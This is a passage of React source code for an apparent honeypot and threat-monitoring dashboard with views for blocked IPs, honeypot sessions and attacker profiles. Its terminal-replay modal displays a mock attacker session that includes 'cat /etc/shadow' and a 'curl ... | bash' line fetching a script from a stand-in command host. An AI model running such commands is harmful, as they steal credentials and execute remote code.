                      { country: "🇨🇳 China", count: 47, vector: "SQL Injection", level: "CRITICAL", share: "32%" },
                      { country: "🇷🇺 Russia", count: 31, vector: "Vulnerability Scanners", level: "HIGH", share: "22%" },
                      { country: "🇧🇷 Brazil", count: 28, vector: "Cross-Site Scripting", level: "HIGH", share: "19%" },
                      { country: "🇩🇪 Germany", count: 19, vector: "Credential Brute Force", level: "MEDIUM", share: "13%" },
                      { country: "🇮🇳 India", count: 14, vector: "Path Traversal", level: "MEDIUM", share: "9%" },
                      { country: "🇺🇸 USA", count: 9, vector: "Automated Bot Probe", level: "LOW", share: "5%" },
                    ].map((row) => (
                      <tr key={row.country} style={{ borderBottom: `1px solid ${T.border}20` }}>
                        <td style={{ padding: "6px 8px", fontWeight: 600, color: T.text }}>{row.country}</td>
                        <td style={{ padding: "6px 8px", fontFamily: "monospace", color: T.blue }}>{row.count}</td>
                        <td style={{ padding: "6px 8px", color: T.muted }}>{row.vector}</td>
                        <td style={{ padding: "6px 8px" }}>
                          <Badge level={row.level} small />
                        </td>
                        <td style={{ padding: "6px 8px", fontFamily: "monospace", color: T.text }}>{row.share}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </Card>
            </div>
          )}

          {/* ════ VIEW 5: BLOCKED IPS ════ */}
          {activeNav === "blocked" && (
            <Card>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  marginBottom: 16,
                  flexWrap: "wrap",
                  gap: 10,
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <span style={{ fontSize: 14 }}>🚫</span>
                  <span style={{ fontWeight: 600, fontSize: 14 }}>BLOCKED IPS MANAGEMENT</span>
                  <span style={{ color: T.muted, fontSize: 12 }}>({blockedList.length} blocked)</span>
                </div>
                <div style={{ display: "flex", gap: 8 }}>
                  <Btn small primary onClick={() => setBlockIPModal(true)}>
                    + Block IP Manually
                  </Btn>
                  <Btn
                    small
                    onClick={() => {
                      const csv =
                        "IP,Reason,BlockedAt,Expires\n" +
                        blockedList.map((b) => `${b.ip},"${b.reason}",${b.blockedAt},${b.expires}`).join("\n");
                      const blob = new Blob([csv], { type: "text/csv" });
                      const url = URL.createObjectURL(blob);
                      const a = document.createElement("a");
                      a.href = url;
                      a.download = "blocked_ips.csv";
                      a.click();
                    }}
                  >
                    Export List
                  </Btn>
                </div>
              </div>

              <div style={{ overflowX: "auto" }}>
                <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse" }}>
                  <thead>
                    <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                      {["IP Address", "Reason", "Blocked At", "Expires", "Action"].map((h) => (
                        <th
                          key={h}
                          style={{
                            color: T.muted,
                            padding: "6px 8px",
                            textAlign: "left",
                            fontWeight: 500,
                            fontSize: 11,
                          }}
                        >
                          {h}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {blockedList.map((b) => (
                      <tr key={b.ip} style={{ borderBottom: `1px solid ${T.border}20` }}>
                        <td
                          style={{
                            padding: "8px 8px",
                            fontFamily: "monospace",
                            color: T.blue,
                            fontWeight: 600,
                            cursor: "pointer",
                          }}
                          onClick={() => onOpenAttacker(b.ip)}
                        >
                          {b.ip}
                        </td>
                        <td style={{ padding: "8px 8px", color: T.text }}>{b.reason}</td>
                        <td style={{ padding: "8px 8px", color: T.muted, fontFamily: "monospace", fontSize: 11 }}>
                          {b.blockedAt}
                        </td>
                        <td style={{ padding: "8px 8px" }}>
                          <span
                            style={{
                              color: b.permanent ? T.critical : T.medium,
                              fontFamily: "monospace",
                              fontSize: 11,
                              fontWeight: 600,
                            }}
                          >
                            {b.expires}
                          </span>
                        </td>
                        <td style={{ padding: "8px 8px" }}>
                          <Btn small danger onClick={() => handleUnblock(b.ip)}>
                            Unblock
                          </Btn>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </Card>
          )}

          {/* ════ VIEW 6: HONEYPOT SESSIONS ════ */}
          {activeNav === "honeypot" && (
            <div>
              {/* Honeypot Stat Cards */}
              <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 12, marginBottom: 14 }}>
                <StatCard
                  icon="🍯"
                  label="Total Sessions"
                  value={honeypotSessions.length}
                  sub="All time: 142"
                  color={T.purple}
                />
                <StatCard
                  icon="🟢"
                  label="Live Now"
                  value={honeypotLiveCount}
                  sub="Actively trapped"
                  color={T.low}
                />
                <StatCard
                  icon="⏱️"
                  label="Avg Duration"
                  value="2m 18s"
                  sub="Per session"
                  color={T.blue}
                />
              </div>

              <Card>
                <PanelTitle
                  icon="🍯"
                  title="HONEYPOT SESSIONS"
                  right={<span style={{ color: T.muted, fontSize: 11 }}>Click a session to view captured actions</span>}
                />

                <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
                  {honeypotSessions.map((s) => {
                    const isExp = expandedSessionId === s.id;
                    return (
                      <div
                        key={s.id}
                        style={{
                          background: T.surface2,
                          border: `1px solid ${isExp ? T.purple + "60" : T.border}`,
                          borderRadius: 6,
                          overflow: "hidden",
                        }}
                      >
                        <div
                          onClick={() => setExpandedSessionId(isExp ? null : s.id)}
                          style={{
                            padding: "10px 14px",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "space-between",
                            cursor: "pointer",
                          }}
                        >
                          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                            <span
                              style={{
                                width: 8,
                                height: 8,
                                borderRadius: "50%",
                                background: s.live ? T.low : T.muted,
                                boxShadow: s.live ? `0 0 6px ${T.low}` : "none",
                              }}
                            />
                            <div>
                              <span style={{ fontFamily: "monospace", fontSize: 12, color: T.blue, fontWeight: 600 }}>
                                {s.ip}
                              </span>
                              <span style={{ color: T.muted, fontSize: 11, marginLeft: 8 }}>{s.country}</span>
                            </div>
                            <span style={{ color: T.muted, fontSize: 11 }}>
                              Started {s.started} · {s.live ? "ongoing" : "ended"}
                            </span>
                          </div>

                          <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
                            <div style={{ textAlign: "right" }}>
                              <span style={{ fontFamily: "monospace", fontSize: 11, color: T.text }}>{s.duration}</span>
                              <div style={{ fontSize: 10, color: T.muted }}>{s.requestsCount} requests</div>
                            </div>
                            <span style={{ color: T.muted, fontSize: 12 }}>{isExp ? "▲" : "▼"}</span>
                          </div>
                        </div>

                        {/* Expanded Actions Table */}
                        {isExp && (
                          <div style={{ padding: "0 14px 14px", borderTop: `1px solid ${T.border}40` }}>
                            <div
                              style={{
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "space-between",
                                margin: "10px 0 8px",
                              }}
                            >
                              <div style={{ fontSize: 11, fontWeight: 600, color: T.muted }}>CAPTURED ACTIONS</div>
                              <Btn small onClick={() => setTerminalReplaySession(s)}>
                                ▶ Replay Virtual Shell Session
                              </Btn>
                            </div>

                            <table style={{ width: "100%", fontSize: 11, borderCollapse: "collapse" }}>
                              <thead>
                                <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                                  {["Time", "Method", "Endpoint", "Tool Fingerprint"].map((h) => (
                                    <th
                                      key={h}
                                      style={{
                                        color: T.muted,
                                        textAlign: "left",
                                        padding: "4px 6px",
                                        fontWeight: 500,
                                      }}
                                    >
                                      {h}
                                    </th>
                                  ))}
                                </tr>
                              </thead>
                              <tbody>
                                {s.actions.map((act, i) => (
                                  <tr key={i} style={{ borderBottom: `1px solid ${T.border}20` }}>
                                    <td style={{ padding: "5px 6px", fontFamily: "monospace", color: T.muted }}>
                                      {act.time}
                                    </td>
                                    <td style={{ padding: "5px 6px", fontFamily: "monospace", color: T.blue }}>
                                      {act.method}
                                    </td>
                                    <td style={{ padding: "5px 6px", fontFamily: "monospace", color: T.text }}>
                                      {act.endpoint}
                                    </td>
                                    <td style={{ padding: "5px 6px" }}>
                                      <span
                                        style={{
                                          background: T.critBg,
                                          border: `1px solid ${T.critical}60`,
                                          color: T.critical,
                                          padding: "1px 6px",
                                          borderRadius: 3,
                                          fontSize: 10,
                                          fontFamily: "monospace",
                                        }}
                                      >
                                        {act.tool}
                                      </span>
                                    </td>
                                  </tr>
                                ))}
                              </tbody>
                            </table>
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              </Card>
            </div>
          )}

          {/* ════ VIEW 7: ATTACKERS GRID ════ */}
          {activeNav === "attackers" && (
            <div>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  marginBottom: 16,
                  flexWrap: "wrap",
                  gap: 10,
                }}
              >
                <div style={{ flex: 1, maxWidth: 360 }}>
                  <input
                    value={attackerSearch}
                    onChange={(e) => setAttackerSearch(e.target.value)}
                    placeholder="Search by IP or country..."
                    style={{
                      width: "100%",
                      background: T.surface2,
                      border: `1px solid ${T.border}`,
                      color: T.text,
                      borderRadius: 5,
                      padding: "8px 12px",
                      fontSize: 12,
                    }}
                  />
                </div>
                <span style={{ color: T.muted, fontSize: 12 }}>{filteredAttackers.length} attackers tracked</span>
              </div>

              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14 }}>
                {filteredAttackers.map((att) => (
                  <Card key={att.ip} style={{ padding: "16px" }}>
                    <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", marginBottom: 12 }}>
                      <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                        <div
                          style={{
                            width: 36,
                            height: 36,
                            borderRadius: "50%",
                            background: `linear-gradient(135deg, ${T.surface2}, ${sevColor[att.level]}40)`,
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            fontSize: 16,
                          }}
                        >
                          🤖
                        </div>
                        <div>
                          <div style={{ fontFamily: "monospace", fontSize: 14, fontWeight: 700, color: T.text }}>
                            {att.ip}
                          </div>
                          <div style={{ fontSize: 11, color: T.muted }}>
                            {att.flag} {att.city}, {att.country}
                          </div>
                        </div>
                      </div>
                      <Badge level={att.level} small />
                    </div>

                    <div style={{ fontSize: 11, color: T.muted, marginBottom: 8 }}>
                      <div>ISP: {att.isp}</div>
                      <div>Sessions: {att.sessions} · Total attacks: {att.total} · Last seen: {att.last}</div>
                    </div>

                    <div style={{ display: "flex", gap: 6, flexWrap: "wrap", marginBottom: 12 }}>
                      {att.tools.length > 0 ? (
                        att.tools.map((t) => (
                          <span
                            key={t}
                            style={{
                              background: T.critBg,
                              border: `1px solid ${T.critical}50`,
                              color: T.critical,
                              padding: "2px 8px",
                              borderRadius: 3,
                              fontSize: 10,
                              fontFamily: "monospace",
                            }}
                          >
                            {t}
                          </span>
                        ))
                      ) : (
                        <span style={{ color: T.muted, fontSize: 10 }}>No tools fingerprinted</span>
                      )}
                    </div>

                    <Btn
                      small
                      style={{ width: "100%", justifyContent: "center" }}
                      onClick={() => onOpenAttacker(att.ip)}
                    >
                      View Full Profile →
                    </Btn>
                  </Card>
                ))}
              </div>
            </div>
          )}

          {/* ════ VIEW 8: SITES MANAGEMENT ════ */}
          {activeNav === "sites" && (
            <Card>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 16 }}>
                <div>
                  <span style={{ fontWeight: 600, fontSize: 14 }}>REGISTERED SITES</span>
                  <span style={{ color: T.muted, fontSize: 12, marginLeft: 8 }}>({sites.length} sites)</span>
                </div>
                <Btn small primary onClick={() => setAddSiteModal(true)}>
                  + Register New Site
                </Btn>
              </div>

              <div style={{ overflowX: "auto" }}>
                <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse" }}>
                  <thead>
                    <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                      {["Website", "API Key", "Status", "Created", "Checks (24h)", "Actions"].map((h) => (
                        <th
                          key={h}
                          style={{
                            color: T.muted,
                            padding: "6px 8px",
                            textAlign: "left",
                            fontWeight: 500,
                            fontSize: 11,
                          }}
                        >
                          {h}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {sites.map((st) => (
                      <tr key={st.key} style={{ borderBottom: `1px solid ${T.border}20` }}>
                        <td style={{ padding: "8px 8px", fontWeight: 600, color: T.blue }}>
                          <a
                            href={st.url}
                            target="_blank"
                            rel="noreferrer"
                            style={{ color: T.blue, textDecoration: "none" }}
                          >
                            {st.url}
                          </a>
                        </td>
                        <td style={{ padding: "8px 8px", fontFamily: "monospace", color: T.muted, fontSize: 11 }}>
                          {st.key.slice(0, 10)}...
                        </td>
                        <td style={{ padding: "8px 8px" }}>
                          <span
                            style={{
                              color: st.status === "Active" ? T.low : T.high,
                              fontSize: 11,
                              fontWeight: 600,
                            }}
                          >
                            ● {st.status}
                          </span>
                        </td>
                        <td style={{ padding: "8px 8px", color: T.muted, fontFamily: "monospace", fontSize: 11 }}>
                          {st.created}
                        </td>
                        <td style={{ padding: "8px 8px", fontFamily: "monospace", color: T.text }}>{st.checks}</td>
                        <td style={{ padding: "8px 8px" }}>
                          <Btn small>Settings</Btn>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </Card>
          )}

          {/* ════ VIEW 9: REPORTS ════ */}
          {activeNav === "reports" && (
            <div>
              <Card style={{ marginBottom: 16 }}>
                <PanelTitle icon="📄" title="GENERATE NEW REPORT" />
                <div style={{ display: "flex", alignItems: "center", gap: 12, flexWrap: "wrap", marginBottom: 10 }}>
                  <div>
                    <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>From</label>
                    <input
                      type="date"
                      defaultValue="2026-06-01"
                      style={{
                        background: T.surface2,
                        border: `1px solid ${T.border}`,
                        color: T.text,
                        borderRadius: 4,
                        padding: "6px 10px",
                        fontSize: 12,
                      }}
                    />
                  </div>
                  <div>
                    <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>To</label>
                    <input
                      type="date"
                      defaultValue="2026-06-07"
                      style={{
                        background: T.surface2,
                        border: `1px solid ${T.border}`,
                        color: T.text,
                        borderRadius: 4,
                        padding: "6px 10px",
                        fontSize: 12,
                      }}
                    />
                  </div>
                  <div style={{ alignSelf: "flex-end" }}>
                    <Btn primary onClick={() => setReportSuccessModal(true)}>
                      📊 Generate PDF Report
                    </Btn>
                  </div>
                </div>
                <p style={{ color: T.muted, fontSize: 12, margin: 0 }}>
                  Report includes executive summary, attack breakdown charts, top 20 threat events, and attacker profiles
                  for the selected period.
                </p>
              </Card>

              <Card>
                <PanelTitle icon="🗄️" title="REPORT HISTORY" />
                <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                  {[
                    {
                      name: "Weekly Threat Report — Jun 1-7",
                      sub: "Jun 1 – Jun 7, 2026 · generated 2026-06-07 09:00",
                      size: "430 KB",
                    },
                    {
                      name: "Weekly Threat Report — May 25-31",
                      sub: "May 25 – May 31, 2026 · generated 2026-05-31 09:00",
                      size: "481 KB",
                    },
                    {
                      name: "Monthly Summary — May 2026",
                      sub: "May 1 – May 31, 2026 · generated 2026-06-01 09:05",
                      size: "1.2 MB",
                    },
                  ].map((r, i) => (
                    <div
                      key={i}
                      style={{
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "space-between",
                        padding: "8px 12px",
                        background: T.surface2,
                        borderRadius: 5,
                      }}
                    >
                      <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                        <span>📄</span>
                        <div>
                          <div style={{ fontSize: 12, fontWeight: 600, color: T.text }}>{r.name}</div>
                          <div style={{ fontSize: 10, color: T.muted }}>{r.sub}</div>
                        </div>
                      </div>
                      <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                        <span style={{ fontSize: 11, fontFamily: "monospace", color: T.muted }}>{r.size}</span>
                        <Btn small onClick={() => alert(`Downloading ${r.name}...`)}>
                          Download
                        </Btn>
                      </div>
                    </div>
                  ))}
                </div>
              </Card>
            </div>
          )}

          {/* ════ VIEW 10: SETTINGS ════ */}
          {activeNav === "settings" && (
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
              {/* Column 1: Account */}
              <Card>
                <PanelTitle icon="👤" title="ACCOUNT" />
                <div style={{ marginBottom: 14 }}>
                  <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>Email</label>
                  <input
                    defaultValue="client@example.com"
                    style={{
                      width: "100%",
                      background: T.surface2,
                      border: `1px solid ${T.border}`,
                      color: T.text,
                      borderRadius: 4,
                      padding: "8px 10px",
                      fontSize: 12,
                    }}
                  />
                </div>
                <div style={{ marginBottom: 16 }}>
                  <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>Company Name</label>
                  <input
                    defaultValue="SnapNest Pvt Ltd"
                    style={{
                      width: "100%",
                      background: T.surface2,
                      border: `1px solid ${T.border}`,
                      color: T.text,
                      borderRadius: 4,
                      padding: "8px 10px",
                      fontSize: 12,
                    }}
                  />
                </div>
                <Btn primary small onClick={() => alert("Changes saved successfully!")}>
                  Save Changes
                </Btn>

                <div style={{ borderTop: `1px solid ${T.border}`, marginTop: 20, paddingTop: 16 }}>
                  <div style={{ fontSize: 12, fontWeight: 600, color: T.text, marginBottom: 6 }}>
                    JWT / Master API Key
                  </div>
                  <div style={{ display: "flex", gap: 8, marginBottom: 8 }}>
                    <input
                      type={showApiKey ? "text" : "password"}
                      value={apiKey}
                      readOnly
                      style={{
                        flex: 1,
                        background: T.surface2,
                        border: `1px solid ${T.border}`,
                        color: T.text,
                        borderRadius: 4,
                        padding: "6px 10px",
                        fontSize: 11,
                        fontFamily: "monospace",
                      }}
                    />
                    <Btn small onClick={() => setShowApiKey(!showApiKey)}>
                      {showApiKey ? "Hide" : "Show"}
                    </Btn>
                  </div>
                  <Btn small danger onClick={handleRegenerateKey}>
                    Regenerate Key
                  </Btn>
                </div>
              </Card>

              {/* Column 2: Notification Preferences & Danger Zone */}
              <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
                <Card>
                  <PanelTitle icon="🔔" title="NOTIFICATION PREFERENCES" />
                  <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
                    {[
                      {
                        key: "emailAlerts",
                        label: "Email alerts",
                        sub: "Get notified for MEDIUM, HIGH, and CRITICAL threats",
                      },
                      {
                        key: "criticalOnly",
                        label: "Critical only mode",
                        sub: "Only email me for CRITICAL severity events",
                      },
                      {
                        key: "weeklyDigest",
                        label: "Weekly digest",
                        sub: "Summary report emailed every Monday at 9 AM",
                      },
                    ].map((item) => (
                      <div
                        key={item.key}
                        style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}
                      >
                        <div>
                          <div style={{ fontSize: 12, fontWeight: 600, color: T.text }}>{item.label}</div>
                          <div style={{ fontSize: 11, color: T.muted }}>{item.sub}</div>
                        </div>
                        <input
                          type="checkbox"
                          checked={notifySettings[item.key]}
                          onChange={(e) =>
                            setNotifySettings({ ...notifySettings, [item.key]: e.target.checked })
                          }
                          style={{ width: 16, height: 16, cursor: "pointer", accentColor: T.green }}
                        />
                      </div>
                    ))}
                  </div>
                </Card>

                <Card style={{ border: `1px solid ${T.critical}50` }}>
                  <PanelTitle icon="⚠️" title="DANGER ZONE" />
                  <p style={{ color: T.muted, fontSize: 12, margin: "0 0 12px" }}>
                    Deleting your account permanently removes all sites, threat history, and API keys.
                  </p>
                  <Btn danger small onClick={() => alert("Account deletion is disabled in preview mode.")}>
                    Delete Account
                  </Btn>
                </Card>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* ── Modals ── */}
      {/* Add Site Modal */}
      <Modal title="+ Register New Site" isOpen={addSiteModal} onClose={() => setAddSiteModal(false)}>
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          <div>
            <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>Site Name</label>
            <input
              value={newSiteName}
              onChange={(e) => setNewSiteName(e.target.value)}
              placeholder="e.g. Production API"
              style={{
                width: "100%",
                background: T.surface2,
                border: `1px solid ${T.border}`,
                color: T.text,
                borderRadius: 4,
                padding: "8px 10px",
                fontSize: 12,
              }}
            />
          </div>
          <div>
            <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>Website / Origin URL</label>
            <input
              value={newSiteUrl}
              onChange={(e) => setNewSiteUrl(e.target.value)}
              placeholder="https://app.yourdomain.com"
              style={{
                width: "100%",
                background: T.surface2,
                border: `1px solid ${T.border}`,
                color: T.text,
                borderRadius: 4,
                padding: "8px 10px",
                fontSize: 12,
              }}
            />
          </div>
          <div style={{ display: "flex", justifyContent: "flex-end", gap: 8, marginTop: 8 }}>
            <Btn small onClick={() => setAddSiteModal(false)}>
              Cancel
            </Btn>
            <Btn small primary onClick={handleRegisterSite}>
              Register Site
            </Btn>
          </div>
        </div>
      </Modal>

      {/* Block IP Modal */}
      <Modal title="+ Block IP Address" isOpen={blockIPModal} onClose={() => setBlockIPModal(false)}>
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          <div>
            <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>IP Address</label>
            <input
              value={newBlockIP}
              onChange={(e) => setNewBlockIP(e.target.value)}
              placeholder="e.g. 192.168.1.50"
              style={{
                width: "100%",
                background: T.surface2,
                border: `1px solid ${T.border}`,
                color: T.text,
                borderRadius: 4,
                padding: "8px 10px",
                fontSize: 12,
                fontFamily: "monospace",
              }}
            />
          </div>
          <div>
            <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>Block Reason</label>
            <input
              value={newBlockReason}
              onChange={(e) => setNewBlockReason(e.target.value)}
              placeholder="e.g. Repeated SQL injection attempts"
              style={{
                width: "100%",
                background: T.surface2,
                border: `1px solid ${T.border}`,
                color: T.text,
                borderRadius: 4,
                padding: "8px 10px",
                fontSize: 12,
              }}
            />
          </div>
          <div>
            <label style={{ fontSize: 11, color: T.muted, display: "block", marginBottom: 4 }}>Duration</label>
            <select
              value={newBlockDuration}
              onChange={(e) => setNewBlockDuration(e.target.value)}
              style={{
                width: "100%",
                background: T.surface2,
                border: `1px solid ${T.border}`,
                color: T.text,
                borderRadius: 4,
                padding: "8px 10px",
                fontSize: 12,
              }}
            >
              <option value="1 Hour">1 Hour</option>
              <option value="24 Hours">24 Hours</option>
              <option value="7 Days">7 Days</option>
              <option value="Permanent">Permanent</option>
            </select>
          </div>
          <div style={{ display: "flex", justifyContent: "flex-end", gap: 8, marginTop: 8 }}>
            <Btn small onClick={() => setBlockIPModal(false)}>
              Cancel
            </Btn>
            <Btn small danger onClick={handleCreateBlock}>
              Enforce Block
            </Btn>
          </div>
        </div>
      </Modal>

      {/* Terminal Replay Modal */}
      <Modal
        title={terminalReplaySession ? `Honeypot Virtual Shell Replay: ${terminalReplaySession.ip}` : "Terminal Replay"}
        isOpen={!!terminalReplaySession}
        onClose={() => setTerminalReplaySession(null)}
        width={650}
      >
        {terminalReplaySession && (
          <div style={{ fontFamily: "monospace", fontSize: 12 }}>
            <div
              style={{
                background: "#000",
                padding: 16,
                borderRadius: 6,
                color: "#00FF66",
                minHeight: 240,
                lineHeight: 1.6,
                border: `1px solid ${T.border}`,
              }}
            >
              <div style={{ color: "#888" }}># Session ID: {terminalReplaySession.id}</div>
              <div style={{ color: "#888" }}># Attacker Origin: {terminalReplaySession.country} ({terminalReplaySession.ip})</div>
              <div style={{ color: "#888" }}># Adaptive Tarpit Delay: 1800ms injected</div>
              <div style={{ margin: "10px 0" }}>[system] attacker connected via fake /admin gateway...</div>
              <div>$ id</div>
              <div style={{ color: "#FFF" }}>uid=0(root) gid=0(root) groups=0(root)</div>
              <div>$ uname -a</div>
              <div style={{ color: "#FFF" }}>Linux guardian-corp-srv 5.15.0-89-generic #99-Ubuntu SMP</div>
              <div>$ cat /etc/shadow</div>
              <div style={{ color: "#FF8888" }}>[CANARY TOKEN TRIGGERED] root:$6$FakeHoneySalt$8w912...:19142:0:99999:7:::</div>
              <div>$ curl http://attacker-c2.net/exfil.sh | bash</div>
              <div style={{ color: "#E3B341" }}>[TARPIT ENGAGED] Bandwidth throttled to 120 bytes/sec. Honeytoken exfiltration logged.</div>
            </div>
            <div style={{ display: "flex", justifyContent: "flex-end", marginTop: 12 }}>
              <Btn small onClick={() => setTerminalReplaySession(null)}>
                Close Replay
              </Btn>
            </div>
          </div>
        )}
      </Modal>

      {/* Report Success Modal */}
      <Modal title="Export PDF Threat Report" isOpen={reportSuccessModal} onClose={() => setReportSuccessModal(false)}>
        <div style={{ textAlign: "center", padding: "10px 0" }}>
          <div style={{ fontSize: 36, marginBottom: 10 }}>📄</div>
          <div style={{ fontWeight: 600, fontSize: 15, color: T.text, marginBottom: 6 }}>
            Executive Threat Report Ready
          </div>
          <p style={{ fontSize: 12, color: T.muted, marginBottom: 20 }}>
            Includes 24-hour incident timeline, Top Attacker attribution, Honeytoken telemetry, and STIX 2.1 indicators.
          </p>
          <div style={{ display: "flex", justifyContent: "center", gap: 10 }}>
            <Btn
              primary
              onClick={() => {
                alert("PDF Threat Report successfully downloaded.");
                setReportSuccessModal(false);
              }}
            >
              📥 Download PDF (1.2 MB)
            </Btn>
            <Btn small onClick={() => setReportSuccessModal(false)}>
              Close
            </Btn>
          </div>
        </div>
      </Modal>
    </div>
  );
}

// ── Screen: Attacker Profile (Full Deep Dive) ──────────────────────────────
function AttackerProfile({ ip, onBack, onBlockIP }) {
  const [blocked, setBlocked] = useState(false);
  const attacker = useMemo(() => {
    return (
      INITIAL_ATTACKERS.find((a) => a.ip === ip) || {
        ip: ip || "192.168.1.100",
        country: "China",
        flag: "🇨🇳",
        city: "Beijing",
        isp: "China Telecom",
        ua: "sqlmap/1.7.8#dev (https://sqlmap.org)",
        lang: "zh-CN",
        tools: ["sqlmap", "nikto"],
        first: "2026-06-01 09:14",
        last: "10:31",
        total: 47,
        sessions: 3,
        level: "CRITICAL",
      }
    );
  }, [ip]);

  const recentAttacks = useMemo(() => {
    return [
      { time: "10:31:02", method: "POST", path: "/admin/db", type: "SQLi", level: "CRITICAL", score: 96, action: "honeypot" },
      { time: "10:30:14", method: "GET", path: "/login", type: "SQLi", level: "CRITICAL", score: 92, action: "honeypot" },
      { time: "10:28:40", method: "GET", path: "/api/users", type: "Scanner", level: "HIGH", score: 81, action: "blocked" },
      { time: "10:24:12", method: "POST", path: "/upload", type: "BruteForce", level: "HIGH", score: 78, action: "blocked" },
      { time: "10:20:05", method: "GET", path: "/search", type: "XSS", level: "MEDIUM", score: 54, action: "logged" },
    ];
  }, []);

  return (
    <div style={{ minHeight: "100vh", background: T.bg, color: T.text, overflowY: "auto" }}>
      <div
        style={{
          borderBottom: `1px solid ${T.border}`,
          padding: "12px 24px",
          display: "flex",
          alignItems: "center",
          gap: 12,
          background: T.surface,
          position: "sticky",
          top: 0,
          zIndex: 10,
        }}
      >
        <button
          onClick={onBack}
          style={{
            background: "transparent",
            border: `1px solid ${T.border}`,
            color: T.muted,
            padding: "5px 12px",
            borderRadius: 4,
            cursor: "pointer",
            fontSize: 12,
            fontFamily: "inherit",
          }}
        >
          ← Back to Dashboard
        </button>
        <span style={{ fontWeight: 600, fontSize: 14 }}>Attacker Profile: {attacker.ip}</span>
        <Badge level={attacker.level} />
      </div>

      <div style={{ maxWidth: 960, margin: "0 auto", padding: 24 }}>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
          {/* Identity */}
          <Card style={{ padding: 20 }}>
            <PanelTitle icon="👤" title="IDENTITY" />
            <div style={{ display: "flex", alignItems: "center", gap: 14, marginBottom: 18 }}>
              <div
                style={{
                  width: 52,
                  height: 52,
                  borderRadius: "50%",
                  background: `linear-gradient(135deg, ${T.critical}, ${T.purple})`,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  fontSize: 22,
                  flexShrink: 0,
                }}
              >
                🤖
              </div>
              <div>
                <div style={{ fontFamily: "monospace", fontSize: 18, fontWeight: 700, color: T.critical }}>
                  {attacker.ip}
                </div>
                <div style={{ color: T.muted, fontSize: 12, marginTop: 3 }}>
                  📍 {attacker.city}, {attacker.country} · {attacker.isp}
                </div>
              </div>
            </div>
            {[
              ["Browser / OS", attacker.ua],
              ["Accept-Language", attacker.lang],
              ["First Seen", attacker.first],
              ["Last Seen", attacker.last],
            ].map(([k, v]) => (
              <div
                key={k}
                style={{
                  display: "flex",
                  gap: 12,
                  padding: "7px 0",
                  borderTop: `1px solid ${T.border}20`,
                  alignItems: "flex-start",
                }}
              >
                <span style={{ color: T.muted, fontSize: 11, minWidth: 110, flexShrink: 0 }}>{k}</span>
                <span style={{ fontSize: 11, color: T.text, fontFamily: "monospace", wordBreak: "break-all" }}>
                  {v}
                </span>
              </div>
            ))}
          </Card>

          {/* Stats & Tools */}
          <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10 }}>
              <StatCard
                icon="⚡"
                label="Total Attacks"
                value={attacker.total}
                sub="Across all sessions"
                color={T.critical}
              />
              <StatCard
                icon="🍯"
                label="Honeypot Sessions"
                value={attacker.sessions}
                sub="Avg 4m 12s each"
                color={T.purple}
              />
            </div>
            <Card style={{ padding: 18 }}>
              <PanelTitle icon="🔧" title="DETECTED TOOLS" />
              <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
                {attacker.tools.map((t) => (
                  <span
                    key={t}
                    style={{
                      background: T.critBg,
                      border: `1px solid ${T.critical}60`,
                      color: T.critical,
                      padding: "3px 10px",
                      borderRadius: 3,
                      fontSize: 12,
                      fontFamily: "monospace",
                    }}
                  >
                    {t}
                  </span>
                ))}
              </div>
              <div style={{ marginTop: 12 }}>
                <div style={{ fontSize: 11, color: T.muted, marginBottom: 6 }}>
                  Attack frequency ({attacker.total} total)
                </div>
                <div style={{ background: T.surface2, borderRadius: 4, height: 8, overflow: "hidden" }}>
                  <div
                    style={{
                      width: "94%",
                      height: "100%",
